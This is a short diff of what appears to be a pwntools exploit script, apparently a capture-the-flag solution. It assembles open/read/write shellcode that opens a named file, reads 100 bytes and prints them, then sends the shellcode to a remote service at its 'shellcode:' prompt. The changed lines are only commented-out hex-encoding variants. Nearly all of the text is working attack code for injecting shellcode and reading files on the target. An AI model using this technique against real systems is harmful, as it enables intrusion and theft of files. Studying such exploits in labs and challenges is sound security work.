@@ -11,11 +11,11 @@ shellcode += shellcraft.open(filename)
 shellcode += shellcraft.read('rax', 'rsp', 100)     #read 100 bytes to buf which is [rsp]
 shellcode += shellcraft.write(1, 'rsp', 100)        #output buf
 
-#shellcode_hex =  asm(shellcode).encode('hex')
+#shellcode_hex = shellcode.encode('hex')
 
 conn.recvuntil('shellcode: ')
 conn.send(asm(shellcode))
-#conn.send(shellcode_hex.decode('hex'))
+#conn.send(asm(shellcode_hex.decode('hex')))
 
 log.success(conn.recvline())
 #print conn.recv(1024)
